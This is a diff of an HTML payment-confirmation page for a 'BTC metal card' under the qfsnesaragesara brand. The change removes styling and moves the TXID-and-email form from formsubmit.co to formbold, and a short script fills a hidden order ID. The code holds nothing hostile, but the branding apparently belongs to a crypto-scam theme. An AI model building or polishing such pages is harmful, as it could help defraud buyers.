@@ -21,16 +21,14 @@
     margin: 0;
     padding: 0;
     font-family: Inter, -apple-system, BlinkMacSystemFont, "SF Pro Text", system-ui;
-    background:
-      radial-gradient(circle at top, rgba(56,189,248,0.35), transparent 55%),
-      radial-gradient(circle at bottom, rgba(147,51,234,0.35), transparent 60%),
-      var(--bg);
+    background: radial-gradient(circle at top, rgba(56,189,248,0.35), transparent 55%),
+                radial-gradient(circle at bottom, rgba(147,51,234,0.35), transparent 60%),
+                var(--bg);
     color: var(--text);
     display: flex;
     justify-content: center;
     align-items: center;
     height: 100vh;
-    overflow-x: hidden;
   }
 
   .container {
@@ -41,21 +39,7 @@
     border-radius: 28px;
     border: 1px solid var(--glass-border);
     backdrop-filter: blur(28px);
-    box-shadow:
-      0 0 0 1px rgba(255,255,255,0.12),
-      0 28px 80px rgba(0,0,0,0.65),
-      inset 0 0 50px rgba(56,189,248,0.05);
-    animation: floatUp 1.2s ease forwards;
-    transform: translateY(22px);
-    opacity: 0;
     text-align:center;
-  }
-
-  @keyframes floatUp {
-    to {
-      transform: translateY(0);
-      opacity: 1;
-    }
   }
 
   .logo {
@@ -83,15 +67,6 @@
 
   strong { color: var(--accent); }
 
-  label {
-    font-size: 14px;
-    font-weight: 600;
-    margin-bottom: 6px;
-    color: var(--text);
-    display: block;
-    text-align: left;
-  }
-
   input[type="text"],
   input[type="email"] {
     width: 100%;
@@ -103,19 +78,11 @@
     color: var(--text);
     font-size: 16px;
     outline: none;
-    transition: 0.25s ease;
-    backdrop-filter: blur(12px);
-  }
-
-  input:focus {
-    border-color: var(--accent);
-    box-shadow: 0 0 12px rgba(56,189,248,0.45);
-    background: rgba(255,255,255,0.12);
   }
 
   .btn {
     width: 100%;
-    margin-top: 32px;
+    margin-top: 30px;
     padding: 15px;
     font-size: 18px;
     font-weight: 700;
@@ -124,24 +91,6 @@
     color: #fff;
     border: none;
     cursor: pointer;
-    transition: 0.25s ease;
-    letter-spacing: 0.5px;
-    box-shadow:
-      0 10px 35px rgba(56,189,248,0.35),
-      0 0 0 1px rgba(255,255,255,0.08);
-  }
-
-  .btn:hover {
-    transform: translateY(-2px);
-    box-shadow:
-      0 14px 45px rgba(56,189,248,0.55),
-      0 0 0 1px rgba(255,255,255,0.18);
-  }
-
-  .order-note {
-    margin-top:10px;
-    font-size:13px;
-    color:var(--muted);
   }
 </style>
 </head>
@@ -149,41 +98,47 @@
 <body>
 <div class="container">
 
-    <img class="logo"
-         src="https://github.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/blob/main/photo%201.jpg?raw=true"
-         alt="Brand Logo">
+  <img class="logo"
+       src="https://github.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/blob/main/photo%201.jpg?raw=true"
+       alt="Brand Logo">
 
-    <h1>Order Submitted</h1>
-    <p><strong>Payment Confirmation Required</strong></p>
-    <p>Enter your TXID and email so our team can verify your blockchain payment.</p>
-    <p class="order-note">A unique Order ID will be generated on the next page.</p>
+  <h1>Payment Confirmation</h1>
+  <p><strong>Final Step Required</strong></p>
+  <p>Enter your Transaction Hash (TXID) and email to complete your order confirmation.</p>
 
-    <form action="https://formsubmit.co/support@qfsnesaragesara.org"
-          method="POST">
+  <form id="confirmForm"
+        action="https://formbold.com/s/oW1Ay"
+        method="POST">
 
-        <!-- Redirect After Submit -->
-        <input type="hidden" name="_next"
-               value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-payment.html">
+    <!-- Redirect after submit -->
+    <input type="hidden" name="redirect"
+           value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-payment.html">
 
-        <!-- Disable Captcha -->
-        <input type="hidden" name="_captcha" value="false">
+    <!-- Order ID -->
+    <input type="hidden" id="orderIdField" name="Order ID">
 
-        <!-- Table Format -->
-        <input type="hidden" name="_template" value="table">
+    <label>Transaction Hash (TXID)</label>
+    <input type="text" name="TXID" placeholder="Enter your TXID" required>
 
-        <!-- Honeypot -->
-        <input type="text" name="_honey" style="display:none">
+    <label>Email Address</label>
+    <input type="email" name="Email" placeholder="Enter your email" required>
 
-        <label>Transaction Hash (TXID)</label>
-        <input type="text" name="Transaction Hash" placeholder="Enter your TXID" required>
-
-        <label>Your Email Address</label>
-        <input type="email" name="Email" placeholder="Enter your email" required>
-
-        <button type="submit" class="btn">Submit Confirmation</button>
-    </form>
+    <button type="submit" class="btn">Submit Confirmation</button>
+  </form>
 
 </div>
+
+<script>
+/* Retrieve Order ID from localStorage or URL */
+(function(){
+    const params = new URLSearchParams(window.location.search);
+    const fromUrl = params.get("order");
+    const fromLocal = localStorage.getItem("qfsOrderId");
+
+    const orderId = fromUrl || fromLocal || "";
+    document.getElementById("orderIdField").value = orderId;
+})();
+</script>
 
 </body>
 </html>
